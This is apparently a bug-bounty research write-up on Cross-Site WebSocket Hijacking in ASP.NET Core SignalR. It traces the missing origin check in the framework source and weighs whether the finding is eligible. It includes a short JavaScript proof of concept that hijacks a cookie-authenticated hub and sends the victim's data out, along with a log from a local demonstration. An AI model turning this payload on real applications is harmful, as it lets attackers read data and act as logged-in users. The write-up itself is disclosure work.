# Chain #2 (new): SignalR Cross-Site WebSocket Hijacking → authenticated hub access as the victim

**Class:** CWE-1385 (Cross-Site WebSocket Hijacking) → authenticated action/data access.
**Component:** `Microsoft.AspNetCore.Http.Connections` / `Microsoft.AspNetCore.SignalR` (distinct from Chain #1's Aspire dashboard).
**Status:** architecturally real and traced in source; eligibility gated by the "documented CSWSH / app-responsibility" question (honest read below).

---

## The mechanism (traced in source, `main`)

1. **A WebSocket to a SignalR hub needs no negotiate token.**
   `HttpConnectionDispatcher.ExecuteAsync` (`src/SignalR/common/Http.Connections/src/Internal/HttpConnectionDispatcher.cs`): for a WS request (line 317) it calls `GetOrCreateConnectionAsync` (line 320). That method (line 1122) reads `id` from the query (`GetConnectionToken`, line 614); **if `id` is empty it calls `CreateConnection(options)` — a brand-new connection, no negotiate, no token.**

2. **No origin check anywhere in the connection layer.** `grep -rni origin` across `Http.Connections/src` and `SignalR/server/Core/src` returns nothing. The dispatcher never inspects the `Origin` header.

3. **The browser attaches the victim's cookies to a cross-origin WebSocket.** Unlike `fetch`/XHR, a cross-site `new WebSocket()` is not gated by CORS and sends the target site's cookies. So the created connection is authenticated **as the victim** whenever the hub uses cookie auth.

4. **The attacker drives the hub manually over the WS.** Raw frames: handshake `{"protocol":"json","version":1}\x1e`, then invocations `{"type":1,"target":"<HubMethod>","arguments":[...]}\x1e`. The attacker's own JS can both send and read on the WS it opened, so it invokes hub methods and reads their results — full bidirectional authenticated hub access from `evil.com`.

### Minimal PoC shape
```html
<script>
 const ws = new WebSocket("wss://victim-app.example/chatHub");  // no negotiate, cross-origin
 ws.onopen = () => {
   ws.send('{"protocol":"json","version":1}\x1e');              // SignalR handshake
   ws.send('{"type":1,"target":"GetMyPrivateData","arguments":[]}\x1e'); // runs as the victim
 };
 ws.onmessage = e => exfiltrate(e.data);                        // read the victim's data
</script>
```

---

## What's in scope vs defended

- **Vulnerable subset:** SignalR apps that (a) use **cookie authentication** and (b) allow the **WebSockets** transport (default). Impact = whatever the hub exposes to an authenticated user: reading the victim's data, performing actions as them, admin methods — i.e. account-scoped compromise, driven from any web page the victim visits.
- **NOT vulnerable — bearer/token auth:** hubs that authenticate via `access_token` query param or `Authorization` header are safe — those aren't sent cross-origin, so the hijacked connection is unauthenticated.
- **NOT vulnerable — Blazor Server:** `ComponentHub.StartCircuit` (`src/Components/Server/src/ComponentHub.cs:106`, validation at :380) requires **data-protected component descriptors** issued in the victim's page render. A cross-origin attacker can't read or forge them, so the circuit never starts. Blazor Server is defended despite sharing the no-origin-check transport.

---

## Honest eligibility read

This is the textbook **CSWSH** class, which Microsoft's SignalR security documentation discusses, generally framing cross-origin control as the app's responsibility (configure CORS / restrict origins; WebSockets intentionally rely on the negotiate-token-over-CORS flow for the standard client). Two readings:

- **Fatal (likely):** "WebSockets bypass CORS by design; verify origin yourself if you need to" → app-responsibility, declined. The tokenless-WS `CreateConnection` path is intended (supports `skipNegotiation`).
- **Survivable:** the *default* `dotnet new` SignalR + cookie-auth pattern is exploitable with **zero app misconfiguration and no framework warning at the point of use** — a secure-default gap. The framework could reject WS upgrades whose `Origin` host isn't same-site unless the app opts into cross-origin, exactly as `dotnet watch` already does with its localhost origin allowlist (`BrowserRefreshServer`/`WebSocketConfig.GetAllowedOriginDomains`). That same-origin-by-default stance exists elsewhere in the product but not here.

My estimate: lower than Chain #1 — maybe 15-30% — because CSWSH is well-trodden and documented. The strongest submission angle is the **inconsistency**: `dotnet watch` origin-allowlists WebSockets by default, Aspire tried to (and botched it), but core SignalR does not — so "verify origin" is treated as a framework duty in two sibling components and punted to the app in the most widely-used one.

## DEMONSTRATED end-to-end (2026-10-10)

Built a stock `Microsoft.NET.Sdk.Web` app: `AddSignalR()`, cookie-style auth, `MapHub<SecretHub>("/secretHub")`, hub method `[Authorize] GetMySecret()` returning the caller's secret. An in-process raw-socket "attacker" then connected exactly as a cross-origin browser page would — no negotiate `id`, `Origin: http://evil.attacker.com`, and the victim's `auth=victim-alice` cookie:

```
WS upgrade (no negotiate id, Origin=evil.attacker.com) -> HTTP/1.1 101 Switching Protocols
connected cross-origin with NO token; connection authenticated by victim cookie
handshake: {}
invoked [Authorize] GetMySecret() as the victim:
<= {"type":3,"invocationId":"1","result":"TOP-SECRET-DATA-OF[victim-alice]"}
```

Confirmed: the framework accepted a tokenless cross-origin WebSocket with no origin check, authenticated it from the attached cookie, and ran an `[Authorize]` hub method as the victim, returning their data to the attacker. The only browser-side assumption — that a cross-origin `new WebSocket()` auto-attaches the target's cookies — is standard browser behavior and the entire basis of CSWSH. "Architecturally real" is now "demonstrated."
